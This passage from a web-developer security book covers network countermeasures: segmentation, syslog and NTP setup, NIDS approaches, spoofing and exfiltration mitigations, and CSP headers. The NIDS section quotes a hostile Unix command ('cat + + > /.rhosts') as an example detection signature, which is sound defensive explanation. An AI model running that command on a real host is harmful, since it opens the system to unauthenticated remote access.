  <figcaption></figcaption>
</figure>


<p>By creating network segments containing only the resources specific to the consumers that you authorise access to, you are creating an environment of <a href="chap06.html#web-applications-countermeasures-management-of-application-secrets-least-privilege">least privilege</a>, where only those authorised to access resources can access them.</p>

<p>For example, if you felt it was essential for your kitchen appliances to be able to talk to the internet, then put them all on a separate network segment, and tightly constrain their privileges.</p>

<p>By segmenting a network, it creates a point of indirection that the attacker has to attempt to navigate passage through. Depending on how the gateway is configured, depends how difficult and time consuming it is to traverse.</p>

<p>Network segmentation has the potential to limit damage to the specific segment affected.</p>

<p>PCI-DSS provides guidance on why and how to reduce your compliance scope, much of this comes down to segmenting all card holder data from the rest of the network.</p>

<p>I spoke a little about host firewalls in the VPS chapter. In regards to network firewalls, they play an important role in allowing (white listing) only certain hosts, network segments, ports, protocols, etc into any given gateways network interface.</p>

<p>Logging, alerting, IDS/IPS play an important part in monitoring, providing visibility and even preventing some network attacks. They were discussed in the context of hosts in the VPS chapter and similarly apply to networking, we will address these in the next section. </p>

<p>
  <strong>Component Placement</strong>
</p>

<p>Some examples of how and where you could/should place components:</p>

<p>Servers that need to serve the World Wide Web, should be on a demilitarisation zone (DMZ). Your organisations corporate LAN should only have network access to the DMZ in order to perform administrative activities at the most, SSH and possibly port 443. It is also a good idea to define which host IP addresses should be allowed traversal from the LAN gateway interface. In some cases even network access is locked down and physical access is the only way to access DMZ resources. The DMZ gateway interface should have rules to only allow what is necessary to another network segment as discussed briefly in the <a href="chap03.html#vps-countermeasures-preparation-for-dmz">VPS chapter</a>, for example:</p>

<ul>
  <li>To data-stores if necessary</li>
  <li>For <a href="chap03.html#vps-countermeasures-using-components-with-known-vulnerabilities">system updates</a>
</li>
  <li>DNS if necessary. Also review the sections on DNS spoofing and Data Exfiltration leveraging DNS later in this chapter</li>
  <li>To a syslog server, <a href="chap04.html#network-countermeasures-lack-of-visibility-insufficient-logging">as discussed</a> later in this chapter and also in the <a href="chap03.html#vps-countermeasures-lack-of-visibility-logging-and-alerting">VPS chapter</a>
</li>
  <li>Access to <a href="chap04.html#network-countermeasures-fortress-mentality-insufficient-logging-ntp">time server</a> (NTP)</li>
</ul>

<p>Consider putting resources like data-stores in a secluded segment. VLAN or physical, but isolate them as much as possible.</p>

<p>Also consider using <a href="chap03.html#vps-countermeasures-docker">Docker containers</a> which provide some free isolation.</p>

<h4 id="leanpub-auto-lack-of-visibility-3">Lack of Visibility</h4>

<figure class="image center" style="width: 396px;">
  <img src="images/ThreatTags----PreventionAVERAGE.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>There are quite a few things that can be done to improve visibility on your networks. Let us address logging and Network Intrusion Detection Systems.</p>

<h5 id="network-countermeasures-lack-of-visibility-insufficient-logging">Insufficient Logging</h5>

<p>If you think back to the Web Server Log Management countermeasures section in the VPS chapter, we outlined an <a href="chap03.html#vps-countermeasures-lack-of-visibility-web-server-log-management-environmental-considerations">Environmental Considerations</a> section, in which I deferred to this section, as it made more sense to discuss alternative device system logging such as routers, layer 3 switches, in some cases layer 2 switches, data-store, and file servers here in the Network chapter rather than under VPS. Let us address that now. </p>

<p>
  <strong>Steps in order of dependencies</strong>
</p>


<figure class="image center" style="width: 396px;">
  <img src="images/NetworkSysloging.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>None of these are ideal, as UDP provides no reliable messaging and it is crucial that no system log messages are lost, which we can not guarantee with UDP. Also with some network components, we may not be able to provide confidentiality or integrity of messages over the wire from network appliances that only support UDP without TLS (DTLS), a VPN, or any type of encryption. This means we can no longer relly on our logs to provide the truth. The best case below still falls short in terms of reliability, as the test setup used pfSense which only supports sending syslogs via UDP. The best you could hope for in this case is that there is not much internal network congestion, or find a router that supports TCP at a minimum.</p>

<p>
  <strong>Steps with details</strong>
</p>

<p>Here we discuss three steps. Each step has a selection of options. You could choose one option from each of the three steps.</p>

<ol class="numeric">
  <li>As per the PaperTrail set-up we performed in our test lab</li>
  <li>
    <ul>
      <li>Create persistence of FreeNAS syslogs, as currently they are lost on shutdown because FreeNAS runs entirely in RAM
        <ul>
          <li>Create a dataset called syslog on your ZFS zpool and reset.</li>
        </ul>
      </li>
      <li>(Option <strong>first choice</strong>, for pfSense)
        <ul>
          <li>Create a jail in FreeNAS, <a href="https://forums.freenas.org/index.php?threads/how-to-install-openvpn-inside-a-jail-in-freenas-9-2-1-6-with-access-to-remote-hosts-via-nat.22873/">install OpenVPN in the jail</a>, install rsyslogd in the jail and configure it to accept syslog events via UDP as TCP is not supported, from the host and the remote hosts, and forward them on via TCP(possibly with RELP)/TLS to the external syslog aggregator.</li>
        </ul>
      </li>
      <li>(Option <strong>second choice</strong>) Receive syslogs from local FreeNAS and other internal appliances that only send using UDP (pfSense in our example lab, and possibly layer 3 (even 2) switches and APs) and possibly some appliances that can send via TCP.
        <ul>
          <li>Download and run <a href="http://www.syslogappliance.de/en/">SyslogAppliance</a> which is a turn-key VM for any VMware environment. SyslogAppliance is a purpose built slim Debian instance with <a href="http://www.syslogappliance.de/download/syslogappliance-0.0.6/README.txt">no sshd installed</a>, that can receive syslog messages from many types of appliances, including routers, firewalls, switches, and even Windows event logs via UDP and TCP. SyslogAppliance also <a href="http://www.syslog.org/forum/profile/?area=showposts;u=29">supports TLS</a> and comes preconfigured with rsyslog and <a href="http://loganalyzer.adiscon.com/">LogAnalyzer</a>, thus providing <a href="http://www.syslogappliance.de/en/features.php">log analysis and alerting</a>. This means step 3 is no longer required, as it is being performed by LogAnalyzer. This option could also store its logs on an iSCSI target from FreeNAS.</li>
        </ul>
      </li>
      <li>(Option <strong>third choice</strong>) Receive syslogs from local FreeNAS and other internal appliances that only send using UDP (pfSense in our example lab, and possibly layer 3 (even 2) switches and APs).
        <ul>
          <li>The default syslogd in FreeBSD doesnt support TCP.</li>
          <li>Create a jail in FreeNAS, install rsyslogd in the jail and configure it to accept UDP syslog messages and then forward them on via TCP(possibly with RELP)/TLS.</li>
        </ul>
      </li>
    </ul>
  </li>
  <li>
    <ul>
      <li>(Option <strong>first choice</strong> for pfSense) UDP, as TCP is not available.
        <ul>
          <li>In the pfSense Web UI: Set-up a vpn from site a (syslog sending IP address) to site b (syslog receiving IP address / remote log destination).</li>
          <li>Then in Status -&gt; System Logs -&gt; Settings -&gt; Remote Logging Options, add the <code>IP:port</code> of the listening VPN server, which is hosted in the FreeBSD jail of the rsyslogd server (FreeNAS in this example) into one of the Remote log servers input boxes. The other option here is to send to option second choice of step two (SyslogAppliance).</li>
          <li>Your routing table will take care of the rest.</li>
        </ul>
      </li>
      <li>(Option <strong>second choice</strong>)
        <ul>
          <li>Configure syslog UDP only appliances to forward their logs to the rsyslogd in the jail (option third choice of step two), or to option second choice of step two (SyslogAppliance).</li>
        </ul>
      </li>
    </ul>
  </li>
</ol>

<p>There are also a collection of <a href="chap07.html#additional-resources-network-insufficient-logging-internal-network-system-logging">Additional Resources</a> worth looking at.</p>

<h6 id="network-countermeasures-fortress-mentality-insufficient-logging-ntp">Network Time Protocol (NTP)</h6>

<p>As we discussed in the VPS chapter under the <a href="chap03.html#vps-countermeasures-lack-of-visibility-logging-and-alerting">Logging and Alerting</a> section, being able to coalate the times of events of an attackers movements throughout your network is essential in auditing and recreating what actually happened.</p>

<p>
  <strong>Your NTP Server</strong>
</p>

<p>With this set-up, we have got one-to-many Linux servers in a network that all want to be synced with the same up-stream Network Time Protocol (NTP) server(s) that your router (or what ever server you choose to be your NTP authority) uses.</p>

<p>On your router or what ever your NTP server host is, add the NTP server pools. Now how you do this really depends on what you are using for your NTP server, so I will leave this part out of scope. There are many <a href="https://www.google.ie/search?q=ntp+server+pools">NTP pools</a> you can choose from. Pick one or a collection that is as close to your NTP server as possible.</p>

<p>If your NTP daemon is running on your router, you will need to decide and select which router interfaces you want the NTP daemon supplying time to. You almost certainly will not want it on the WAN interface (unless you are a pool member, or the WAN belongs to you) if you have one on your router.</p>

<p>Make sure you restart your NTP daemon.</p>

<p>
  <strong>Your Client Machines</strong>
</p>

<p>There are two NTP packages to disgus.</p>

<ol class="numeric">
  <li>
<strong>ntpdate</strong> is a programme that sets the date on a scheduled occurance via chron, an end user running it manually, or some other means. Ntpdate has been <a href="http://support.ntp.org/bin/view/Dev/DeprecatingNtpdate">deprecated</a> for several years now. The functionality that ntpdate offered is now provided by the ntp daemon. running <code>ntp -q</code> will run ntp, set the time and exit as soon as it has. This functionality mimics how ntpdate is used, the upstream NTP server must be specified either in the <code>/etc/ntp.conf</code> file or overridden by placing it immeiatly after the <code>-q</code> option if running manually. </li>
  <li>
<strong>ntpd</strong> or just ntp, is a daemon that continuously monitors and updates the system time with an upstream NTP server specified in the local systems<br />
<code>/etc/ntp.conf</code>
</li>
</ol>

<p>
  <strong>Setting up NTP</strong>
</p>

<ol class="numeric">
  <li>This is how it used to be done with ntpdate:  
    <p>If you have ntpdate installed, <code>/etc/default/ntpdate</code> specifies that the list of NTP servers is taken from <code>/etc/ntp.conf</code> which does not exist without ntp being installed. It looks like this:  </p>

    <figure class="code">
      <figcaption>/etc/default/ntpdate</figcaption>

<div class="highlight"><pre><code></code> <code class="c1"># Set to "yes" to take the server list from /etc/ntp.conf, from package ntp,</code>
 <code class="c1"># so you only have to keep it in one place.</code>
 <code class="nv">NTPDATE_USE_NTP_CONF</code><code class="o">=</code>yes
</pre></div>

    </figure>

    <p>You would see that it also has a default <code>NTPSERVERS</code> variable set which is overridden if you add your time server to <code>/etc/ntp.conf</code>. If you entered the following and ntpdate is installed:  </p>

    <figure class="code">
<div class="highlight"><pre><code></code> dpkg-query -W -f<code class="o">=</code><code class="s1">'${Status} ${Version}\n'</code> ntpdate
</pre></div>

    </figure>

    <p>You would receive output like:  </p>

    <figure class="code">
<div class="highlight"><pre><code></code> install ok installed <code class="m">1</code>:4.2.6.p5+dfsg-3
</pre></div>

    </figure>
  </li>
  <li>This is how it is done now with ntp:  
    <p>If you enter the following and ntp is installed:</p>

    <figure class="code">
<div class="highlight"><pre><code></code> dpkg-query -W -f<code class="o">=</code><code class="s1">'${Status} ${Version}\n'</code> ntp
</pre></div>

    </figure>

    <p>You will receive output like:  </p>

    <figure class="code">
<div class="highlight"><pre><code></code> install ok installed <code class="m">1</code>:4.2.8p4+dfsg-3
</pre></div>

    </figure>

    <p>Alternatively run this command for more information on the installed state:  </p>

    <figure class="code">
<div class="highlight"><pre><code></code> dpkg-query -l <code class="s1">'*ntp*'</code>
 <code class="c1"># Will also tell you about ntpdate if it is installed.</code>
</pre></div>

    </figure>

    <p>If ntp is not installed, install it with:  </p>

    <figure class="code">
<div class="highlight"><pre><code></code> sudo apt-get install ntp
</pre></div>

    </figure>

    <p>You will find that there is no <code>/etc/default/ntpdate</code> file installed with ntp.  </p>

    <p>The public NTP server(s) can be added straight to the bottom of the <code>/etc/ntp.conf</code> file, but because we want to use our own NTP server, we add the IP address of our server that is configured with our NTP pools to the bottom of the file.  </p>

    <figure class="code">
      <figcaption>/etc/ntp.conf</figcaption>

<div class="highlight"><pre><code></code> server &lt;IP address of your local NTP server here&gt;
</pre></div>

    </figure>

    <p>Now if your NTP daemon is running on your router, hopefully you have everything blocked on its interface(s) by default and are using a white-list for egress filtering. In which case you will need to add a firewall rule to each interface of the router that you want NTP served up on. NTP talks over UDP and listens on port 123 by default. After any configuration changes to your <code>ntpd</code> make sure you restart it. On most routers this is done via the web UI.</p>

    <p>On the client (Linux) machines:  </p>

    <figure class="code">
<div class="highlight"><pre><code></code> sudo service ntp restart
</pre></div>

    </figure>

    <p>Now issuing the date command on your Linux machine will provide the current time with seconds.</p>
  </li>
</ol>

<p>
  <strong>Trouble-shooting</strong>
</p>

<p>The main two commands I use are:</p>

<figure class="code">
<div class="highlight"><pre><code></code>sudo ntpq -c lpeer
</pre></div>

</figure>

<p>Which should produce output like:</p>

<figure class="code">
<div class="highlight"><pre><code></code>remote                        refid                 st t when poll reach delay offset <code class="nv">jitter</code>
<code class="o">============================================================================================</code>
*&lt;server name&gt;.&lt;domain name&gt; &lt;upstream ntp ip address&gt; <code class="m">2</code> u <code class="m">54</code>  <code class="m">64</code>  <code class="m">77</code>  <code class="m">0</code>.189  <code class="m">16</code>.714  <code class="m">11</code>.589
</pre></div>

</figure>

<p>and the standard <a href="http://doc.ntp.org/4.1.0/ntpq.htm">NTP query</a> program followed by the <code>as</code> argument:</p>

<figure class="code">
<div class="highlight"><pre><code></code>ntpq
</pre></div>

</figure>

<p>Which will drop you at the <code>ntpq</code> prompt:</p>

<figure class="code">
<div class="highlight"><pre><code></code>ntpq&gt; as
</pre></div>

</figure>

<p>Which should produce output like:</p>

<figure class="code">
<div class="highlight"><pre><code></code>ind assid status  conf reach auth condition  last_event <code class="nv">cnt</code>
<code class="o">===========================================================</code>
  <code class="m">1</code> <code class="m">15720</code>  963a   yes   yes  none  sys.peer    sys_peer  <code class="m">3</code>
</pre></div>

</figure>

<p>In the first output, the <code>*</code> in front of the remote <a href="http://www.pool.ntp.org/en/use.html">means</a> the server is getting its time successfully from the upstream NTP server(s) which needs to be the case in our scenario. Often you may also get a <code>refid</code> of <code>.INIT</code>. which is one of the Kiss-o-Death Codes which means The association has not yet synchronized for the first time. See the <a href="http://www.iana.org/assignments/ntp-parameters/ntp-parameters.xhtml">NTP parameters</a>. I have found that sometimes you just need to be patient here.</p>

<p>In the second output, if you get a condition of <code>reject</code>, it is usually because your local ntp can not access the NTP server you set-up. Check your firewall rules etc.</p>

<p>Now check all the times are in sync with the <code>date</code> command.</p>

<h5 id="network-countermeasures-lack-of-visibility-nids">Lack of Network Intrusion Detection Systems (NIDS)</h5>
<p>Similar to <a href="chap03.html#vps-countermeasures-lack-of-visibility-host-intrusion-detection-systems-hids">HIDS</a> but acting as a network spy with its network interface (NIC) in promiscuous mode, capturing all traffic crossing the specific network segment that the NIDS is on, ideally before (preventative) it reaches its target. NIDS are usually positioned strategically between a potential attack source and target.</p>

<p>NIDS can be installed into many existing network devices, such as routers, network firewalls, switches, or come out of the box as stand-alone hardware, not consuming any existing hosts resources. HIDS are in most cases reactive, as in the attack has to have already occurred in order to be detected. Where as NIDS/NIPS can analyse the network packets before they reach their target, ideally mitigating the attack. All security is a combination of detection, prevention and response. We need to realise that any single one of these is not enough, but all three are required to achieve defence in depth.</p>

<p><strong>NIDS can operate with Signatures</strong>:</p>

<ol class="numeric">
  <li>String signatures look like known attack strings or sub-strings. <em>For example, such a string signature in UNIX can be cat + + &gt; /.rhosts , which if executed, can cause the system to become extremely vulnerable to network attack.</em> </li>
  <li>Port: <em>Port signatures commonly probes for the connection setup attempts to well known, and frequently attacked ports. Obvious examples include telnet (TCP port 23), FTP (TCP port 21/20), SUNRPC (TCP/UDP port 111), and IMAP (TCP port 143). If these ports arent being used by the site at a point in time, then the incoming packets directed to these ports are considered suspicious.</em></li>
  <li>Header condition: <em>Header signatures are designed to watch for dangerous or illegitimate combinations in packet headers fields. The most famous example is Winnuke, in which a packets port field is NetBIOS port and one of the Urgent pointer, or Out Of Band pointer is set. In earlier version of Windows, this resulted in the blue screen of death. Another well known such header signature is a TCP packet header in which both the SYN and FIN flags are set. This signifies that the requestor is attempting to start and stop a connection simultaneously.</em></li>
</ol>

<blockquote>
  <p>Quotes from the excellent <a href="http://www1.cse.wustl.edu/~jain/cse571-07/ftp/ids/index.html">Survey of Current Network Intrusion Detection Techniques</a></p>
</blockquote>

<p><strong>NIDS can operate with <a href="http://www1.cse.wustl.edu/~jain/cse571-07/ftp/ids/index.html#sec4">Anomalies</a></strong>:</p>

<p>With anomaly detection, a known good state must be established and recorded before the system is able to detect changes to that good state. Similarly to file integrity checkers such as <a href="chap03.html#vps-countermeasures-lack-of-visibility-host-intrusion-detection-systems-hids-deeper-with-stealth">Stealth</a>, the system needs to know what a good state looks like before that good state can be protected. This initial recording of the good state can take time and requires normal operating network traffic without any malicious activity, similar to how we discussed the <a href="chap03.html#vps-countermeasures-preparation-for-dmz">preparation for DMZ</a> in the VPS chapter.</p>

<p><strong>Signature-based pros</strong>:</p>

<ul>
  <li>Off the shelf patterns can be used to match against</li>
  <li>No learning period for the NIDS required</li>
  <li>Faster to match patterns</li>
  <li>Less false positives</li>
  <li>Easier to set-up/configure</li>
</ul>

<p><strong>Signature-based cons</strong>:</p>

<ul>
  <li>Fails when it comes to zero-day attacks, until the signatures have been provided by analysts</li>
  <li>Often do not stand up well to sophisticated new attacks</li>
</ul>

<p><strong>Anomaly-based pros</strong>:</p>

<ul>
  <li>The system can continue to learn and be taught what new attacks look like. Thus the system can grow with your needs</li>
  <li>Does not need existing patterns as signature-based does</li>
  <li>Can react immediately to zero-day attacks because they do not fit the normal known good state</li>
  <li>Stand a much better chance at standing up to sophisticated new attacks</li>
  <li>Effective at establishing good known state for each protocol stack</li>
</ul>

<p><strong>Anomaly-based cons</strong>:</p>

<ul>
  <li>A learning period is required for the NIDS to establish a good known state of normal non-malicious traffic</li>
  <li>More false positives</li>
  <li>Can be harder to set-up/configure</li>
</ul>

<p>Ideally you will set-up NIDS that uses both signature and anomaly based detection.</p>

<p>It is a good idea to have both Host and Network IDS/IPS in place at a minimum. I personally like to have more than one tool doing the same job but with different areas of strength covering the weaker areas of its sibling. An example of this is with HIDS. Having one HIDS on the system it is protecting and another somewhere else on the network, or even on another network completely, looking into the host and performing its checks. This makes discoverability difficult for an attacker.</p>

<p>
  <strong>Some excellent free and open Enterprise grade NIDS</strong>
</p>

<ul>
  <li>
<a href="https://www.snort.org/">Snort</a> is the leader in free and open source NIDS, mature with a strong community, Snort can be seen used in many different scenarios. Written in C, and version 3 which is supposed to be multi-threaded is still <a href="http://blog.snort.org/2014/12/introducing-snort-30.html">in its third alpha</a>. Covering both signature and anomaly-based techniques. Ive personally used Snort and found it a joy to work with</li>
  <li>
<a href="https://www.bro.org/">Bro</a> uses its own domain specific language (DSL), uses anomaly-based detection techniques and is often used in conjunction with Snort, they complement each other well. Bro has many protocol analysers and is also often used for forensic analysis</li>
  <li>
<a href="https://suricata-ids.org/">Suricata</a> is a direct competitor with Snort, is written in C, multi-threaded and supposed to be faster, but possibly only noticed once throughput of 1 Gbps speeds are <a href="https://forum.pfsense.org/index.php?topic=83548.0">well exceeded</a>. SANS produced an <a href="https://www.sans.org/reading-room/whitepapers/intrusion/open-source-ids-high-performance-shootout-35772">Open Source IDS Performance Shootout</a> document worth reading if performance is an issue for you. Suricata can be thought of as the next generation Snort</li>
  <li>
<a href="https://securityonion.net/">Security Onion</a> is an Ubuntu based distribution containing intrusion detection, network security monitoring, and log management tools, such as: OSSEC, Snort, Suricata, Bro, netsniff-ng, Sguil, ELSA, Xplico, NetworkMiner, and many others. This allows you to set-up a free and open source enterprise grade network security appliance</li>
</ul>




<h4 id="network-countermeasures-spoofing">Spoofing</h4>

<p>The following are a collection of mitigations for the types of network spoofing discussed.</p>

<h5 id="network-countermeasures-spoofing-ip">IP</h5>

<figure class="image center" style="width: 396px;">
  <img src="images/ThreatTags----PreventionDIFFICULT.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>Filter incoming packets (ingress) that appear to come from an internal IP address at your perimeter.<br />
Filter outgoing packets (egress) that appear to originate from an invalid local IP address.<br />
Not relying on IP source addresss for authentication (AKA trust relationships). I have seen this on quite a few occasions as the sole form of authentication, this is just not good enough as the only means of authentication.</p>

<h5 id="network-countermeasures-spoofing-arp">ARP (Address Resolution Protocol)</h5>

<figure class="image center" style="width: 396px;">
  <img src="images/ThreatTags----PreventionAVERAGE.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>Use spoofing detection software.<br />
As ARP poisoning is quite noisy. The attacker continually sends <a href="http://en.wikipedia.org/wiki/Address_Resolution_Protocol">ARP packets</a>, IDS can detect and flag it. Then an IPS can deal with it.</p>

<p>Tools such as free and open source <a href="http://arpon.sourceforge.net/">ArpON (ARP handler inspection)</a> do the whole job plus a lot more.<br />
There is also <a href="http://linux.die.net/man/8/arpwatch">ArpWatch</a> and others.</p>

<p>If you have a decent gateway device, you should be able to install and configure Arpwatch.</p>

<h5 id="network-countermeasures-spoofing-dns">DNS</h5>

<figure class="image center" style="width: 396px;">
  <img src="images/ThreatTags----PreventionAVERAGE.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>Many cache poisoning attacks can be prevented on DNS servers by being less trusting of the information passed to them by other DNS servers, and ignoring any DNS records passed back which are not directly relevant to the query.</p>

<p><a href="http://www.dnssec.net/">DNS Security Extensions</a> does the following for us. You will probably need to configure it though on your name server(s). I did.</p>

<ul>
  <li>DNS cache poisoning</li>
  <li>Origin authentication of DNS data</li>
  <li>Data integrity</li>
  <li>Authenticated denial of existence</li>
</ul>

<p>Make sure your <a href="http://www.dnssec.net/software">Name Server</a> supports DNSSEC.</p>

<h5 id="network-countermeasures-spoofing-referrer">Referrer</h5>

<figure class="image center" style="width: 396px;">
  <img src="images/ThreatTags----PreventionEASY.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>Deny all access by default. Require explicit grants to specific roles for access to every function. Implement checks in the controller and possibly the business logic also (defence in depth). Never trust the fact that certain resources appear to be hidden so a user wont be able to access them. </p>

<p>Check the <a href="https://www.owasp.org/index.php/Top_10_2007-Failure_to_Restrict_URL_Access">OWASP Failure to Restrict URL Access</a> for countermeasures and the <a href="https://www.owasp.org/index.php/Guide_to_Authorization">Guide to Authorisation</a>.</p>

<h5 id="network-countermeasures-spoofing-email-address">EMail Address</h5>

<figure class="image center" style="width: 396px;">
  <img src="images/ThreatTags----PreventionDIFFICULT.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>Spoofing of Email will only work if the victims SMTP server does not perform reverse lookups on the hostname.</p>

<p>Key-pair encryption helps somewhat. The headers can still be spoofed, but the message can not, thus providing secrecy and authenticity:</p>

<ul>
  <li>GPG/PGP (uses web of trust for key-pairs)<br />
Application Layer<br />
Used to encrypt an email message body, any file for that matter and also signing.<br />
Email headers not encrypted</li>
  <li>S/MIME (uses Certificate Authorities (CAs)(Can be in-house) TLS using PKI)<br />
Application Layer<br />
Used to encrypt an email message body and also signing<br />
Email headers not encrypted</li>
</ul>

<p>The way the industry is going currently it is looking like the above (same) key-pair encryption will probably be replaced with Forward Secrecy whos key changes on each exchange.</p>

<p>GPG/PGP and S/MIME are similar concepts. Both allow the consumer to encrypt things inside an email.<br />
See my detailed post on GPG/PGP <a href="http://blog.binarymist.net/2015/01/31/gnupg-key-pair-with-sub-keys/">here</a> for more details.</p>

<p>I have noticed some confusion surrounding S/MIME vs TLS.
TLS works at the transport &amp; session layer as opposed to S/MIME at the Application Layer. The only similarity I see is that they both use CAs.</p>

<ul>
  <li>Adjust your spam filters</li>
  <li>Read your message headers and trace IP addresses, although any decent self respecting spammer or social engineer is going to be using proxies.</li>
  <li>Do not click links or execute files from unsolicited emails even if the email appears to be from someone you know. It may not be.</li>
  <li>Make sure your mail provider is using <a href="http://dmarc.org/">Domain-based Message Authentication, Reporting and Conformance (DMARC)</a>
    <ul>
      <li>
<a href="https://tools.ietf.org/html/rfc7208">Sender Policy Framework</a> (SPF) is a path-based email authentication technique in which a receiving mail exchange can check that the incoming email originates from a host authorised by the given domains administrators by way of a specially formatted DNS TXT record</li>
      <li>
<a href="https://tools.ietf.org/html/rfc6376">DomainKeys Identified Mail</a> (DKIM) is a signature-based email authentication technique which also uses a DNS TXT record, the content of which is the DKIM signature, which is comprised of a set of <code>tag=value</code> pairs such as <code>d=&lt;sending domain&gt;</code>, <code>p=&lt;public key&gt;</code>, and <a href="https://tools.ietf.org/html/rfc6376#section-3.2">others</a>, which the receiving mail exchange uses to validate the end-to-end integrity and source of the email message</li>
    </ul>
  </li>
</ul>

<h5 id="network-countermeasures-spoofing-website">Website</h5>

<figure class="image center" style="width: 396px;">
  <img src="images/ThreatTags----PreventionAVERAGE.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>There is nothing to stop someone cloning and hosting a website. The vital part to getting someone to visit an attackers illegitimate website is to either social engineer them to visit it, or just clone a website that you know they are likely to visit. An Intranet at your work place for example. Then you will need to carry out ARP and/or DNS spoofing. Again
tools such as free and open source <a href="http://arpon.sourceforge.net/">ArpON (ARP handler inspection)</a> cover website spoofing and a lot more.</p>

<h4 id="leanpub-auto-data-exfiltration-infiltration">Data Exfiltration, Infiltration</h4>

<figure class="image center" style="width: 396px;">
  <img src="images/ThreatTags----PreventionDIFFICULT.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>There are so many ways to get data in and out of an organisations environment.
The following are some of the countermeasures you need to think about when it comes to stopping unauthorised communications entering your network and/or your data leaving your premises, servers or compute.</p>

<h5 id="leanpub-auto-dropbox">Dropbox</h5>

<p>The options here are to:</p>

<ul>
  <li>Closely monitor the Dropbox and other file sync tools usage by way of <a href="chap04.html#network-countermeasures-lack-of-visibility-nids">NI[D|P]S</a> as we discussed previously in this chapter</li>
  <li>Block Dropbox and other file sync tools entirely at the firewall</li>
</ul>

<p>Being aware of how attackers think and what is possible and how easy it is, will help you design your countermeasures.</p>

<h5 id="leanpub-auto-physical-1">Physical</h5>

<p>We discussed this in the Infectious Media subsection of Countermeasures of the People chapter of <a href="https://leanpub.com/holistic-infosec-for-web-developers/">Fascicle 0</a>.</p>

<h5 id="leanpub-auto-mobile-phone-data-1">Mobile Phone Data</h5>

<p>You could ask that people do not use their cell phones, or perhaps leave them at reception. You could block the cell phone signals, but in many countries this is <a href="https://www.fcc.gov/general/jamming-cell-phones-and-gps-equipment-against-law">illegal</a>. This is a hard one, do some brain-storming with your colleagues.</p>

<h5 id="leanpub-auto-dns-ssh-1">DNS, SSH</h5>

<p>As usual, defence in depth is your best defence.</p>

<p>Basically just stop all traffic from leaving the target network. Even then though, there are many other ways of getting data in and out of your network.</p>

<p>Run a decent HIDS on vulnerable hosts, <a href="chap03.html#vps-countermeasures-lack-of-visibility-host-intrusion-detection-systems-hids">as discussed</a> in the VPS chapter under Lack of Visibility in the Countermeasures subsection. This will let you know if the integrity of any existing files on the vulnerable systems have been compromised, along with any important new files being added or removed.</p>

<p>Run anti-virus that leverages decent machine learning algorithms, this will increase your chances of being informed when malicious payloads are dropped on vulnerable hosts.</p>

<p>Run a decent NIDS on your network, <a href="chap04.html#network-countermeasures-lack-of-visibility-nids">as discussed</a> in the Lack of Visibility subsection of this chapter, covering both signature-based and anomaly-based analysis/detection.</p>

<p>In most cases the target vulnerable hosts will not have a reason to query <code>TXT</code>
records, and especially in the quantity that are used in DNS tunnelling. Consider blocking them.</p>

<h4 id="network-countermeasures-doppelganger-domains">Doppelganger Domains</h4>

<p>Purchase as many doppelganger domains related to your own domain as makes sense and that you can afford. Do what the attacker does on your internal DNS server. If you are embracing defence in depth, then your attacker will have a much harder time compromising you.</p>

<h5 id="network-countermeasures-doppelganger-domains-websites">Web-sites</h5>

<figure class="image center" style="width: 396px;">
  <img src="images/ThreatTags----PreventionAVERAGE.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>Train users to have their wits about these things. Just being aware that this is a technique used by attackers is often enough</p>

<h5 id="network-countermeasures-doppelganger-domains-smtp">SMTP</h5>

<figure class="image center" style="width: 396px;">
  <img src="images/ThreatTags----PreventionAVERAGE.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>Set-up your own internal catch-all SMTP server to correct miss typed domains before someone else does.</p>

<h5 id="network-countermeasures-doppelganger-domains-ssh">SSH</h5>

<figure class="image center" style="width: 396px;">
  <img src="images/ThreatTags----PreventionAVERAGE.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>Do not miss type the domain.<br />
Use <a href="chap03.html#vps-countermeasures-disable-remove-services-harden-what-is-left-ssh-key-pair-authentication">key pair authentication</a> as discussed, so no passwords are exchanged.</p>

<h4 id="network-countermeasures-wrongfully-trusting-the-loading-of-untrusted-web-resources">Wrongfully Trusting the Loading of Untrusted Web Resources</h4>

<p>Also consider the likes of <a href="chap06.html#web-applications-countermeasures-consuming-free-and-open-source">Consuming Free and Open Source</a> in the Web Applications chapter.</p>

<h5 id="network-countermeasures-wrongfully-trusting-the-loading-of-untrusted-web-resources-csp">Content Security Policy (CSP)</h5>

<figure class="image center" style="width: 396px;">
  <img src="images/ThreatTags----PreventionEASY.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>By using CSP, we are providing the browser with a white-list of the types of resources and from where, that we allow to be loaded.<br />
We do this by specifying particular response headers (more specifically directives).</p>

<p>Names removed to save embarrassment. Sadly most banks do not take their web security very seriously. They seem to take the same approach as credit card companies. At this stage it appears to be cheaper to reimburse victims rather than make sure targets never get victimised in the first place. I think this strategy will change as cybercrimes become more prevalent and it becomes cheaper to reduce the occurrences than to react once they have happened.</p>

<figure class="code">
<div class="highlight"><pre><code></code>curl --head https://reputable.kiwi.bank.co.nz/

Content-Security-Policy: default-src <code class="s1">'self'</code> secure.reputable.kiwi.bank.co.nz<code class="p">;</code>
connect-src <code class="s1">'self'</code> secure.reputable.kiwi.bank.co.nz<code class="p">;</code>
frame-src <code class="s1">'self'</code> secure.reputable.kiwi.bank.co.nz player.vimeo.com<code class="p">;</code>
img-src <code class="s1">'self'</code> secure.reputable.kiwi.bank.co.nz *.g.doubleclick.net www.google.com www.google<code class="se">\</code>
.co.nz www.google-analytics.com seal.entrust.net<code class="p">;</code>
object-src <code class="s1">'self'</code> secure.reputable.kiwi.bank.co.nz seal.entrust.net<code class="p">;</code>
<code class="c1"># In either case, authors SHOULD NOT include either 'unsafe-inline' or data: as valid sources\</code>
 in their policies. Both <code class="nb">enable</code> XSS attacks by allowing code to be included directly in the d<code class="se">\</code>
ocument itself
<code class="c1"># unsafe-eval should go without saying</code>
